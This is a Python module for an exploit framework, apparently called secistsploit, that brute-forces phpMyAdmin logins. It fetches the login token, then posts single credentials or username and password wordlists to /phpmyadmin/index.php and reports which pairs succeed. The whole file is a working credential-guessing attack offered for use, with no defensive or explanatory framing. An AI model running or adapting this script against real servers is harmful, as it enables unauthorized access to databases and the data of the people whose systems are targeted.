# -*- coding: UTF-8 -*-
import re
import os
from secistsploit.core.exploit import *
from secistsploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {
        "name": "phpmyadmin_blast",
        "description": "phpmyadmin_blast",
        "authors": (
            "jjiushi",
        ),
        "references": (
            "www.422926799.github.io"
            "www.422926799.github.io"
        ),

    }

    target = OptString("", "Target URl")
    port = OptPort(80, "Target HTTP port")
    username=OptString("root","Target username")
    password=OptString("","Target password")
    user_file=OptString("","Target user_file")
    passwd_file=OptString("","Target passwd_file")
    def __init__(self):
        self.endianness = "<"

    def run(self):
        tokens=[]
        rhost=(self.target)
        rpot=(self.port)
        username=(self.username)
        password=(self.password)
        user_file=(self.user_file)
        passwd_file=(self.passwd_file)


        if username!='' and password!='':
            response = self.http_request(
                method="GET",
                path="/phpmyadmin/index.php",
            )
            if response:
                token=re.findall('[0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]',str(response.text))
                tokens.append(token[0])

            data = {
                'pma_password':'{}'.format(password),
                'pma_username':'{}'.format(username),
                'server':'1',
                'target':'index.php',
                'token':'{}'.format(tokens[0]),
            }

            response2 = self.http_request(
                method="POST",
                path="/phpmyadmin/index.php",
                data=data,
            )

            if response2.status_code==302:
                print('[+] url:{} username:{} and password:{} ok'.format(response2.url,username,password))
            else:
                print('[-] url:{} Not username:{} or password:{} status_code:{}'.format(response2.url,username,passwd_file,response2.status_code))

        if username!='' and password=='' and passwd_file!='':
            if os.path.exists(passwd_file):
                print('[+] {} ok'.format(passwd_file))
            else:
                print('[-] {} Not Found'.format(passwd_file))

            dk=open(passwd_file,'r')
            for p in dk.readlines():
                qc="".join(p.split('\n'))
                response = self.http_request(
                    method="GET",
                    path="/phpmyadmin/index.php",
                )
                if response:
                    token = re.findall(
                        '[0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]',
                        str(response.text))
                    tokens.append(token[0])

                data = {
                    'pma_password': '{}'.format(qc),
                    'pma_username': '{}'.format(username),
                    'server': '1',
                    'target': 'index.php',
                    'token': '{}'.format(tokens[0]),
                }

                response2 = self.http_request(
                    method="POST",
                    path="/phpmyadmin/index.php",
                    data=data,
                )

                if response2.status_code == 302:
                    print('[+] url:{} username:{} and password:{} ok'.format(response2.url, username, qc))
                else:
                    print('[-] url:{} Not username:{} or password:{} status_code:{}'.format(response2.url, username, qc,response2.status_code))

        if user_file!='' and username=='' and password!='' and passwd_file=='':
            if os.path.exists(user_file):
                print('[+] {} ok'.format(user_file))
            else:
                print('[-] {} Not Found'.format(user_file))

            dk=open(user_file,'r')
            for p in dk.readlines():
                qc="".join(p.split('\n'))
                response = self.http_request(
                    method="GET",
                    path="/phpmyadmin/index.php",
                )
                if response:
                    token = re.findall(
                        '[0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]',
                        str(response.text))
                    tokens.append(token[0])

                data = {
                    'pma_password': '{}'.format(password),
                    'pma_username': '{}'.format(qc),
                    'server': '1',
                    'target': 'index.php',
                    'token': '{}'.format(tokens[0]),
                }

                response2 = self.http_request(
                    method="POST",
                    path="/phpmyadmin/index.php",
                    data=data,
                )

                if response2.status_code == 302:
                    print('[+] url:{} username:{} and password:{} ok'.format(response2.url, qc, password))
                else:
                    print('[-] url:{} Not username:{} or password:{} status_code:{}'.format(response2.url, qc,password,response2.status_code))
        if user_file !='' and passwd_file!='' and username=='' and password=='':
            userns=[]
            passwdns=[]
            if os.path.exists(user_file):
                print('[+] {} ok'.format(user_file))
            else:
                print('[-] {} Not Found'.format(user_file))

            dk = open(user_file, 'r')
            for p in dk.readlines():
                qc = "".join(p.split('\n'))
                userns.append(qc)

            if os.path.exists(passwd_file):
                print('[+] {} ok'.format(passwd_file))
            else:
                print('[-] {} Not Found'.format(passwd_file))

            dk2=open(passwd_file,'r')
            for p2 in dk2.readlines():
                qc2="".join(p2.split('\n'))
                passwdns.append(qc2)

            for b in range(0,len(userns)):
                response = self.http_request(
                    method="GET",
                    path="/phpmyadmin/index.php",
                )
                if response:
                    token = re.findall(
                        '[0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]',
                        str(response.text))
                    tokens.append(token[0])

                data = {
                    'pma_password': '{}'.format(passwdns[b]),
                    'pma_username': '{}'.format(userns[b]),
                    'server': '1',
                    'target': 'index.php',
                    'token': '{}'.format(tokens[0]),
                }

                response2 = self.http_request(
                    method="POST",
                    path="/phpmyadmin/index.php",
                    data=data,
                )

                if response2.status_code == 302:
                    print('[+] url:{} username:{} and password:{} ok'.format(response2.url, userns[b], passwdns[b]))
                else:
                    print('[-] url:{} Not username:{} or password:{} status_code:{}'.format(response2.url, userns[b],passwdns[b],response2.status_code))